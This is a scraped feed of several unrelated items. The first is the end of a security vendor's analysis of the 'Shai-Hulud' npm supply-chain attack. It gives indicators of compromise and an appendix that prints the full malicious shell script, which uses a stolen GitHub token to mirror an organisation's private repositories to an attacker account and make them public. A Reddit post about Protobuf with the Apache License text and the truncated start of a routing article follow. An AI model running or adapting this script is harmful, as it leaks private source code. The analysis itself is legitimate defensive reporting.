${</span><span>t</span><span>}`</span><span>)</span></p></div><div><p><span>}</span></p></div><div><p><span>}</span></p></div></code></pre></figure></div><p><strong>Impact</strong></p><p>At the time of writing, at least 650+ repositories appear to be affected by this attack, as observed in a <a href="https://github.com/search?q=%22Shai-Hulud+Migration%22&amp;type=repositories">GitHub search</a>.</p><h2>Indicators of Compromise (IOC)</h2><ul><li><code>bundle.js</code> SHA2 <code>46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09</code></li><li>GitHub repositories with description <code>Shai-Hulud Migration</code> <a href="https://github.com/search?q=%22Shai-Hulud+Migration%22&amp;type=repositories">example</a></li><li>HTTP requests to <code>hxxps://webhook[.]site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7</code></li></ul><h2>Appendix</h2><p>Manually formatted shell script from <code>bundle.js</code> that exfiltrates private repositories using a compromised GitHub token and makes them public with the description <code>Shai-Hulud Migration</code>:</p><div><figure><pre><code><div><p><span>#!/bin/bash</span></p></div><div><p><span>#-----------------------------------------------------------------------</span></p></div><div><p><span># This script is designed to migrate all private and internal GitHub</span></p></div><div><p><span># repositories from a source organization to a target user's account.</span></p></div><div><p><span>#</span></p></div><div><p><span># It performs the following actions:</span></p></div><div><p><span># 1. Fetches all non-archived private and internal repositories from the SOURCE_ORG.</span></p></div><div><p><span># 2. For each repository, it creates a new private repository under the TARGET_USER.</span></p></div><div><p><span># 3. It then mirrors the original repository to the new one.</span></p></div><div><p><span># 4. Crucially, it removes the .github/workflows directory during migration.</span></p></div><div><p><span># 5. After a successful migration, it makes the new repository PUBLIC.</span></p></div><div><p><span>#</span></p></div><div><p><span># Usage:</span></p></div><div><p><span># ./migrate_script.sh <source_org> <target_user> <github_token></github_token></target_user></source_org></span></p></div><div><p><span>#</span></p></div><div><p><span># Arguments:</span></p></div><div><p><span># SOURCE_ORG: The name of the GitHub organization to migrate from.</span></p></div><div><p><span># TARGET_USER: The GitHub username to migrate the repositories to.</span></p></div><div><p><span># GITHUB_TOKEN: A personal access token with 'repo' scope.</span></p></div><div><p><span>#-----------------------------------------------------------------------</span></p></div><div><p><span>SOURCE_ORG</span><span>=</span><span>""</span></p></div><div><p><span>TARGET_USER</span><span>=</span><span>""</span></p></div><div><p><span>GITHUB_TOKEN</span><span>=</span><span>""</span></p></div><div><p><span>PER_PAGE</span><span>=</span><span>100</span></p></div><div><p><span>TEMP_DIR</span><span>=</span><span>""</span></p></div><div><p><span># --- Argument Validation ---</span></p></div><div><p><span>if</span><span> [[ </span><span>$#</span><span>-lt</span><span>3</span><span> ]]; </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: Missing arguments."</span></p></div><div><p><span>echo</span><span>"Usage: </span><span>$0</span><span> <source_org> <target_user> <github_token>"</github_token></target_user></source_org></span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>SOURCE_ORG</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>TARGET_USER</span><span>=</span><span>"</span><span>$2</span><span>"</span></p></div><div><p><span>GITHUB_TOKEN</span><span>=</span><span>"</span><span>$3</span><span>"</span></p></div><div><p><span>if</span><span> [[ </span><span>-z</span><span>"</span><span>$SOURCE_ORG</span><span>"</span><span>||</span><span>-z</span><span>"</span><span>$TARGET_USER</span><span>"</span><span>||</span><span>-z</span><span>"</span><span>$GITHUB_TOKEN</span><span>"</span><span> ]]; </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: All three arguments are required."</span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span># Create a temporary directory for cloning repositories</span></p></div><div><p><span>TEMP_DIR</span><span>=</span><span>"./temp</span><span>$TARGET_USER</span><span>"</span></p></div><div><p><span>mkdir</span><span>-p</span><span>"</span><span>$TEMP_DIR</span><span>"</span></p></div><div><p><span>TEMP_DIR</span><span>=</span><span>$(</span><span>realpath</span><span>"</span><span>$TEMP_DIR</span><span>"</span><span>)</span></p></div><div><p><span># --- Function to make authenticated GitHub API calls ---</span></p></div><div><p><span>github_api</span><span>() {</span></p></div><div><p><span>local</span><span> endpoint</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> method</span><span>=</span><span>"</span><span>${2</span><span>:-</span><span>GET</span><span>}</span><span>"</span></p></div><div><p><span>local</span><span> data</span><span>=</span><span>"</span><span>${3</span><span>:-</span><span>}</span><span>"</span></p></div><div><p><span>local</span><span> curl_args</span><span>=</span><span>(</span><span>"-s"</span><span>"-w"</span><span>"%{http_code}"</span><span>"-H"</span><span>"Authorization: token </span><span>$GITHUB_TOKEN</span><span>"</span><span>"-H"</span><span>"Accept: application/vnd.github.v3+json"</span><span>)</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$method</span><span>"</span><span>!=</span><span>"GET"</span><span> ]]; </span><span>then</span></p></div><div><p><span>curl_args</span><span>+=</span><span>(</span><span>"-X"</span><span>"</span><span>$method</span><span>"</span><span>)</span></p></div><div><p><span>fi</span></p></div><div><p><span>if</span><span> [[ </span><span>-n</span><span>"</span><span>$data</span><span>"</span><span> ]]; </span><span>then</span></p></div><div><p><span>curl_args</span><span>+=</span><span>(</span><span>"-H"</span><span>"Content-Type: application/json"</span><span>"-d"</span><span>"</span><span>$data</span><span>"</span><span>)</span></p></div><div><p><span>fi</span></p></div><div><p><span>curl</span><span>"${</span><span>curl_args</span><span>[</span><span>@</span><span>]}"</span><span>"https://api.github.com</span><span>$endpoint</span><span>"</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to retrieve all repositories from an organization ---</span></p></div><div><p><span>get_all_repos</span><span>() {</span></p></div><div><p><span>local</span><span> org</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> page</span><span>=</span><span>1</span></p></div><div><p><span>local</span><span> all_slugs</span><span>=</span><span>"[]"</span></p></div><div><p><span>while</span><span>true</span><span>; </span><span>do</span></p></div><div><p><span>local</span><span> response</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/orgs/</span><span>$org</span><span>/repos?type=private,internal&amp;per_page=</span><span>$PER_PAGE</span><span>&amp;page=</span><span>$page</span><span>"</span><span>)</span></p></div><div><p><span>local</span><span> http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>local</span><span> body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>!</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>empty</span><span>2&gt;</span><span>/dev/null</span><span>||</span><span>!</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'type == "array"'</span><span>&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>local</span><span> repos_count</span></p></div><div><p><span>repos_count</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>length</span><span>)</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$repos_count</span><span>"</span><span>-eq</span><span>0</span><span> ]]; </span><span>then</span></p></div><div><p><span>break</span></p></div><div><p><span>fi</span></p></div><div><p><span>local</span><span> page_slugs</span></p></div><div><p><span>page_slugs</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>'[.[] | select(.archived == false) | .full_name]'</span><span>)</span></p></div><div><p><span>all_slugs</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$all_slugs</span><span>"</span><span>"</span><span>$page_slugs</span><span>"</span><span>|</span><span>jq</span><span>-s</span><span>'add'</span><span>)</span></p></div><div><p><span>((page</span><span>++</span><span>))</span></p></div><div><p><span>done</span></p></div><div><p><span>echo</span><span>"</span><span>$all_slugs</span><span>"</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to create a new repository for the target user ---</span></p></div><div><p><span>create_repo</span><span>() {</span></p></div><div><p><span>local</span><span> repo_name</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> repo_data</span></p></div><div><p><span>repo_data</span><span>=</span><span>$(</span><span>cat</span><span>&lt;&lt;</span><span>EOF</span></p></div><div><p><span>{</span></p></div><div><p><span>"name": "</span><span>$repo_name</span><span>",</span></p></div><div><p><span>"description": "Shai-Hulud Migration",</span></p></div><div><p><span>"private": true,</span></p></div><div><p><span>"has_issues": false,</span></p></div><div><p><span>"has_projects": false,</span></p></div><div><p><span>"has_wiki": false</span></p></div><div><p><span>}</span></p></div><div><p><span>EOF</span></p></div><div><p><span>)</span></p></div><div><p><span>local</span><span> response</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/user/repos"</span><span>"POST"</span><span>"</span><span>$repo_data</span><span>"</span><span>)</span></p></div><div><p><span>local</span><span> http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>local</span><span> body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'.name'</span><span>&gt;</span><span>/dev/null</span><span>2&gt;&amp;1</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>else</span></p></div><div><p><span># Handle secondary rate limits by sleeping</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$http_code</span><span>"</span><span>=~</span><span> ^4[0-9][0-9]$ ]] &amp;&amp; </span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>grep</span><span>-qi</span><span>"secondary rate"</span><span>; </span><span>then</span></p></div><div><p><span>sleep</span><span>600</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/user/repos"</span><span>"POST"</span><span>"</span><span>$repo_data</span><span>"</span><span>)</span></p></div><div><p><span>http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'.name'</span><span>&gt;</span><span>/dev/null</span><span>2&gt;&amp;1</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>fi</span></p></div><div><p><span>fi</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to make a repository public ---</span></p></div><div><p><span>make_repo_public</span><span>() {</span></p></div><div><p><span>local</span><span> repo_name</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> repo_data</span></p></div><div><p><span>repo_data</span><span>=</span><span>$(</span><span>cat</span><span>&lt;&lt;</span><span>EOF</span></p></div><div><p><span>{</span></p></div><div><p><span>"private": false</span></p></div><div><p><span>}</span></p></div><div><p><span>EOF</span></p></div><div><p><span>)</span></p></div><div><p><span>local</span><span> response</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/repos/</span><span>$TARGET_USER</span><span>/</span><span>$repo_name</span><span>"</span><span>"PATCH"</span><span>"</span><span>$repo_data</span><span>"</span><span>)</span></p></div><div><p><span>local</span><span> http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>local</span><span> body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'.private == false'</span><span>&gt;</span><span>/dev/null</span><span>2&gt;&amp;1</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>else</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to migrate a repository using git mirror ---</span></p></div><div><p><span>migrate_repo</span><span>() {</span></p></div><div><p><span>local</span><span> source_clone_url</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> target_clone_url</span><span>=</span><span>"</span><span>$2</span><span>"</span></p></div><div><p><span>local</span><span> migration_name</span><span>=</span><span>"</span><span>$3</span><span>"</span></p></div><div><p><span>local</span><span> repo_dir</span><span>=</span><span>"</span><span>$TEMP_DIR</span><span>"</span></p></div><div><p><span>if</span><span>!</span><span>git</span><span>clone</span><span>--mirror</span><span>"</span><span>$source_clone_url</span><span>"</span><span>"</span><span>$repo_dir</span><span>/</span><span>$migration_name</span><span>"</span><span>2&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>cd</span><span>"</span><span>$repo_dir</span><span>/</span><span>$migration_name</span><span>"</span></p></div><div><p><span>if</span><span>!</span><span>git</span><span>remote</span><span>set-url</span><span>origin</span><span>"</span><span>$target_clone_url</span><span>"</span><span>2&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>cd</span><span>-</span><span>&gt;</span><span>/dev/null</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span># Temporarily convert to a regular repo to remove workflows</span></p></div><div><p><span>git</span><span>config</span><span>--unset</span><span>core.bare</span></p></div><div><p><span>git</span><span>reset</span><span>--hard</span></p></div><div><p><span># Remove workflows directory and commit the change</span></p></div><div><p><span>if</span><span> [[ </span><span>-d</span><span>".github/workflows"</span><span> ]]; </span><span>then</span></p></div><div><p><span>rm</span><span>-rf</span><span>.github/workflows</span></p></div><div><p><span>git</span><span>add</span><span>-A</span></p></div><div><p><span>git</span><span>commit</span><span>-m</span><span>"Remove GitHub workflows directory"</span></p></div><div><p><span>fi</span></p></div><div><p><span># Convert back to a bare repo for mirroring</span></p></div><div><p><span>git</span><span>config</span><span>core.bare</span><span>true</span></p></div><div><p><span>rm</span><span>-rf</span><span>*</span></p></div><div><p><span>if</span><span>!</span><span>git</span><span>push</span><span>--mirror</span><span>2&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>cd</span><span>-</span><span>&gt;</span><span>/dev/null</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>cd</span><span>-</span><span>&gt;</span><span>/dev/null</span></p></div><div><p><span>rm</span><span>-rf</span><span>"</span><span>$repo_dir</span><span>/</span><span>$migration_name</span><span>"</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to process the list of repositories ---</span></p></div><div><p><span>process_repositories</span><span>() {</span></p></div><div><p><span>local</span><span> repos</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> total_repos</span></p></div><div><p><span>total_repos</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$repos</span><span>"</span><span>|</span><span>jq</span><span>length</span><span>)</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$total_repos</span><span>"</span><span>-eq</span><span>0</span><span> ]]; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>fi</span></p></div><div><p><span>local</span><span> success_count</span><span>=</span></p></div><div><p><span> </span><span>local</span><span> failure_count</span><span>=</span></p></div><div><p><span> </span><span>for</span><span> i </span><span>in</span><span> $(</span><span>seq</span><span>0</span><span> $((</span><span>total_repos</span><span>-</span><span>1</span><span>))); </span><span>do</span></p></div><div><p><span>local</span><span> repo</span></p></div><div><p><span>repo</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$repos</span><span>"</span><span>|</span><span>jq</span><span>-r</span><span>".[</span><span>$i</span><span>]"</span><span>)</span></p></div><div><p><span>local</span><span> migration_name</span><span>=</span><span>"${</span><span>repo</span><span>//</span><span>\/</span><span>/</span><span>-</span><span>}-migration"</span></p></div><div><p><span>local</span><span> auth_source_url</span><span>=</span><span>"https://</span><span>$GITHUB_TOKEN</span><span>@github.com/</span><span>$repo</span><span>.git"</span></p></div><div><p><span>local</span><span> auth_target_url</span><span>=</span><span>"https://</span><span>$GITHUB_TOKEN</span><span>@github.com/</span><span>$TARGET_USER</span><span>/</span><span>$migration_name</span><span>.git"</span></p></div><div><p><span>echo</span><span>"Migrating </span><span>$repo</span><span> to </span><span>$TARGET_USER</span><span>/</span><span>$migration_name</span><span>..."</span></p></div><div><p><span>if</span><span>create_repo</span><span>"</span><span>$migration_name</span><span>"</span><span>; </span><span>then</span></p></div><div><p><span>if</span><span>migrate_repo</span><span>"</span><span>$auth_source_url</span><span>"</span><span>"</span><span>$auth_target_url</span><span>"</span><span>"</span><span>$migration_name</span><span>"</span><span>; </span><span>then</span></p></div><div><p><span>if</span><span>make_repo_public</span><span>"</span><span>$migration_name</span><span>"</span><span>; </span><span>then</span></p></div><div><p><span>echo</span><span>" -&gt; Success: Migrated and made public."</span></p></div><div><p><span>((success_count</span><span>++</span><span>))</span></p></div><div><p><span>else</span></p></div><div><p><span># Still counts as a success if migration worked but public toggle failed</span></p></div><div><p><span>echo</span><span>" -&gt; Warning: Migrated but failed to make public."</span></p></div><div><p><span>((success_count</span><span>++</span><span>))</span></p></div><div><p><span>fi</span></p></div><div><p><span>else</span></p></div><div><p><span>echo</span><span>" -&gt; Error: Migration failed."</span></p></div><div><p><span>((failure_count</span><span>++</span><span>))</span></p></div><div><p><span>fi</span></p></div><div><p><span>else</span></p></div><div><p><span>echo</span><span>" -&gt; Error: Could not create target repository."</span></p></div><div><p><span>((failure_count</span><span>++</span><span>))</span></p></div><div><p><span>fi</span></p></div><div><p><span>done</span></p></div><div><p><span>echo</span><span>"-------------------------------------"</span></p></div><div><p><span>echo</span><span>"Migration Complete."</span></p></div><div><p><span>echo</span><span>"Successful: </span><span>$success_count</span><span>"</span></p></div><div><p><span>echo</span><span>"Failed: </span><span>$failure_count</span><span>"</span></p></div><div><p><span>echo</span><span>"-------------------------------------"</span></p></div><div><p><span>return</span><span> $failure_count</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Main execution block ---</span></p></div><div><p><span>main</span><span>() {</span></p></div><div><p><span># Check for required command-line tools</span></p></div><div><p><span>for</span><span> tool </span><span>in</span><span>curl</span><span>jq</span><span>git</span><span>; </span><span>do</span></p></div><div><p><span>if</span><span>!</span><span>command</span><span>-v</span><span>"</span><span>$tool</span><span>"</span><span> &amp;</span><span>&gt;</span><span> /dev/null; </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: Required tool '</span><span>$tool</span><span>' is not installed."</span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>done</span></p></div><div><p><span>echo</span><span>"Fetching repositories from </span><span>$SOURCE_ORG</span><span>..."</span></p></div><div><p><span>local</span><span> repos</span></p></div><div><p><span>if</span><span>!</span><span> repos</span><span>=</span><span>$(</span><span>get_all_repos</span><span>"</span><span>$SOURCE_ORG</span><span>"</span><span>); </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: Failed to fetch repositories from </span><span>$SOURCE_ORG</span><span>."</span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>process_repositories</span><span>"</span><span>$repos</span><span>"</span></p></div><div><p><span>}</span></p></div><div><p><span># Run main function with provided arguments</span></p></div><div><p><span>main</span><span>"</span><span>$@</span><span>"</span></p></div></code></pre></figure></div></div><div><h3>Tags</h3></div><div><h2>Ready to Secure Your <span>Open Source Dependencies?</span></h2><p>Join thousands of developers and organizations who trust SafeDep to protect their software supply chain.</p></div></article></section></div></section>]]></description><pubDate>Tue, 16 Sep 2025 16:40:37 +0530</pubDate></item><item><link>https://github.com/illegal-instruction-co/sugar-proto</link><title>Why is Protobuf’s C++ API so clunky? Would a nlohmann/json-style wrapper make sense? (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nibv4y/why_is_protobufs_c_api_so_clunky_would_a/</guid><comments>https://www.reddit.com/r/programming/comments/1nibv4y/why_is_protobufs_c_api_so_clunky_would_a/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 9 min | <a href='https://www.reddit.com/r/programming/comments/1nibv4y/why_is_protobufs_c_api_so_clunky_would_a/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Protobuf is powerful and widely used, but working with its C++ API feels unnecessarily verbose:</p><ol><li>- `add_xxx()` returns a pointer</li><li>- `mutable_xxx()` everywhere</li><li>- setting nested fields is boilerplate-heavy</li></ol><p>Compare this to `nlohmann::json` where you can simply do:</p><p><code>cfg[&quot;x&quot;] = 42;</code></p><p><code>cfg[&quot;name&quot;] = &quot;berkay&quot;;</code></p><p>I’ve been toying with the idea of writing a `protoc` plugin that generates wrappers so you can use JSON-like syntax, but under the hood it’s still Protobuf (binary, efficient, type-safe).</p><p>Bonus: wrong types would fail at compile-time.</p><p>Example:</p><p><code>user[&quot;id&quot;] = 123;       // compiles</code></p><p><code>user[&quot;id&quot;] = &quot;oops&quot;;    // compile-time error</code></p><p>Do you think such a library would fill a real gap, or is the verbosity of the official Protobuf API something developers just accept?</p><p>Curious to hear your thoughts.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://opengraph.githubassets.com/f949068e29719813c4c94b6e1be03ed92f7f84c0cf4e5316dbf1bc3813f4cebf/illegal-instruction-co/sugar-proto' /></section><section class='parsed-content'><div><pre> Apache License Version 2.0, January 2004 <a href="http://www.apache.org/licenses/">http://www.apache.org/licenses/</a> TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION 1. Definitions. "License" shall mean the terms and conditions for use, reproduction, and distribution as defined by Sections 1 through 9 of this document. "Licensor" shall mean the copyright owner or entity authorized by the copyright owner that is granting the License. "Legal Entity" shall mean the union of the acting entity and all other entities that control, are controlled by, or are under common control with that entity. For the purposes of this definition, "control" means (i) the power, direct or indirect, to cause the direction or management of such entity, whether by contract or otherwise, or (ii) ownership of fifty percent (50%) or more of the outstanding shares, or (iii) beneficial ownership of such entity. "You" (or "Your") shall mean an individual or Legal Entity exercising permissions granted by this License. "Source" form shall mean the preferred form for making modifications, including but not limited to software source code, documentation source, and configuration files. "Object" form shall mean any form resulting from mechanical transformation or translation of a Source form, including but not limited to compiled object code, generated documentation, and conversions to other media types. "Work" shall mean the work of authorship, whether in Source or Object form, made available under the License, as indicated by a copyright notice that is included in or attached to the work (an example is provided in the Appendix below). "Derivative Works" shall mean any work, whether in Source or Object form, that is based on (or derived from) the Work and for which the editorial revisions, annotations, elaborations, or other modifications represent, as a whole, an original work of authorship. For the purposes of this License, Derivative Works shall not include works that remain separable from, or merely link (or bind by name) to the interfaces of, the Work and Derivative Works thereof. "Contribution" shall mean any work of authorship, including the original version of the Work and any modifications or additions to that Work or Derivative Works thereof, that is intentionally submitted to Licensor for inclusion in the Work by the copyright owner or by an individual or Legal Entity authorized to submit on behalf of the copyright owner. For the purposes of this definition, "submitted" means any form of electronic, verbal, or written communication sent to the Licensor or its representatives, including but not limited to communication on electronic mailing lists, source code control systems, and issue tracking systems that are managed by, or on behalf of, the Licensor for the purpose of discussing and improving the Work, but excluding communication that is conspicuously marked or otherwise designated in writing by the copyright owner as "Not a Contribution." "Contributor" shall mean Licensor and any individual or Legal Entity on behalf of whom a Contribution has been received by Licensor and subsequently incorporated within the Work. 2. Grant of Copyright License. Subject to the terms and conditions of this License, each Contributor hereby grants to You a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare Derivative Works of, publicly display, publicly perform, sublicense, and distribute the Work and such Derivative Works in Source or Object form. 3. Grant of Patent License. Subject to the terms and conditions of this License, each Contributor hereby grants to You a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable (except as stated in this section) patent license to make, have made, use, offer to sell, sell, import, and otherwise transfer the Work, where such license applies only to those patent claims licensable by such Contributor that are necessarily infringed by their Contribution(s) alone or by combination of their Contribution(s) with the Work to which such Contribution(s) was submitted. If You institute patent litigation against any entity (including a cross-claim or counterclaim in a lawsuit) alleging that the Work or a Contribution incorporated within the Work constitutes direct or contributory patent infringement, then any patent licenses granted to You under this License for that Work shall terminate as of the date such litigation is filed. 4. Redistribution. You may reproduce and distribute copies of the Work or Derivative Works thereof in any medium, with or without modifications, and in Source or Object form, provided that You meet the following conditions: (a) You must give any other recipients of the Work or Derivative Works a copy of this License; and (b) You must cause any modified files to carry prominent notices stating that You changed the files; and (c) You must retain, in the Source form of any Derivative Works that You distribute, all copyright, patent, trademark, and attribution notices from the Source form of the Work, excluding those notices that do not pertain to any part of the Derivative Works; and (d) If the Work includes a "NOTICE" text file as part of its distribution, then any Derivative Works that You distribute must include a readable copy of the attribution notices contained within such NOTICE file, excluding those notices that do not pertain to any part of the Derivative Works, in at least one of the following places: within a NOTICE text file distributed as part of the Derivative Works; within the Source form or documentation, if provided along with the Derivative Works; or, within a display generated by the Derivative Works, if and wherever such third-party notices normally appear. The contents of the NOTICE file are for informational purposes only and do not modify the License. You may add Your own attribution notices within Derivative Works that You distribute, alongside or as an addendum to the NOTICE text from the Work, provided that such additional attribution notices cannot be construed as modifying the License. You may add Your own copyright statement to Your modifications and may provide additional or different license terms and conditions for use, reproduction, or distribution of Your modifications, or for any such Derivative Works as a whole, provided Your use, reproduction, and distribution of the Work otherwise complies with the conditions stated in this License. 5. Submission of Contributions. Unless You explicitly state otherwise, any Contribution intentionally submitted for inclusion in the Work by You to the Licensor shall be under the terms and conditions of this License, without any additional terms or conditions. Notwithstanding the above, nothing herein shall supersede or modify the terms of any separate license agreement you may have executed with Licensor regarding such Contributions. 6. Trademarks. This License does not grant permission to use the trade names, trademarks, service marks, or product names of the Licensor, except as required for reasonable and customary use in describing the origin of the Work and reproducing the content of the NOTICE file. 7. Disclaimer of Warranty. Unless required by applicable law or agreed to in writing, Licensor provides the Work (and each Contributor provides its Contributions) on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied, including, without limitation, any warranties or conditions of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A PARTICULAR PURPOSE. You are solely responsible for determining the appropriateness of using or redistributing the Work and assume any risks associated with Your exercise of permissions under this License. 8. Limitation of Liability. In no event and under no legal theory, whether in tort (including negligence), contract, or otherwise, unless required by applicable law (such as deliberate and grossly negligent acts) or agreed to in writing, shall any Contributor be liable to You for damages, including any direct, indirect, special, incidental, or consequential damages of any character arising as a result of this License or out of the use or inability to use the Work (including but not limited to damages for loss of goodwill, work stoppage, computer failure or malfunction, or any and all other commercial damages or losses), even if such Contributor has been advised of the possibility of such damages. 9. Accepting Warranty or Additional Liability. While redistributing the Work or Derivative Works thereof, You may choose to offer, and charge a fee for, acceptance of support, warranty, indemnity, or other liability obligations and/or rights consistent with this License. However, in accepting such obligations, You may act only on Your own behalf and on Your sole responsibility, not on behalf of any other Contributor, and only if You agree to indemnify, defend, and hold each Contributor harmless for any liability incurred by, or claims asserted against, such Contributor by reason of your accepting any such warranty or additional liability. END OF TERMS AND CONDITIONS APPENDIX: How to apply the Apache License to your work. To apply the Apache License to your work, attach the following boilerplate notice, with the fields enclosed by brackets "[]" replaced with your own identifying information. (Don't include the brackets!) The text should be enclosed in the appropriate comment syntax for the file format. We also recommend that a file or class name and description of purpose be included on the same "printed page" as the copyright notice for easier identification within third-party archives. Copyright [yyyy] [name of copyright owner] Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at <a href="http://www.apache.org/licenses/LICENSE-2.0">http://www.apache.org/licenses/LICENSE-2.0</a> Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. </pre></div></section>]]></description><pubDate>Tue, 16 Sep 2025 14:01:31 +0530</pubDate></item><item><link>https://medium.com/@martinvizzolini/a-last-mile-optimizer-that-outperforms-amazons-routes-on-a-laptop-24242f93eb74</link><title>Breaking Amazon's Routing Efficiency on Consumer Hardware: A Technical Deep Dive (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhxlt3/breaking_amazons_routing_efficiency_on_consumer/</guid><comments>https://www.reddit.com/r/programming/comments/1nhxlt3/breaking_amazons_routing_efficiency_on_consumer/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 38 min | <a href='https://www.reddit.com/r/programming/comments/1nhxlt3/breaking_amazons_routing_efficiency_on_consumer/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>I built a route optimizer that runs massive-scale last-mile delivery problems on a personal laptop (MacBook Pro M1, 16 GB RAM).<br/>Benchmarked against Amazon’s official dataset, it consistently reduced total kilometers (~18%), routes (~12%), and improved vehicle utilization (~12%).</p><p>This post explains the methods: batching, concurrency, caching, and constraint-aware clustering — making city-scale routing feasible on consumer hardware.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://miro.medium.com/v2/resize:fit:1200/1*kWdxSg19yVdYFxYdjFEZ-g.png' /></section><section class='parsed-content'><article><div><div><figure><div><p><span>Press enter or click to view image in full size</span></p></div></figure><h2>TL;DR &mdash; Massive-Scale Last-Mile Routing on a Laptop</h2><ul><li><strong>What it is:</strong> a last-mile route optimizer that runs <strong>entirely on a single laptop</strong> 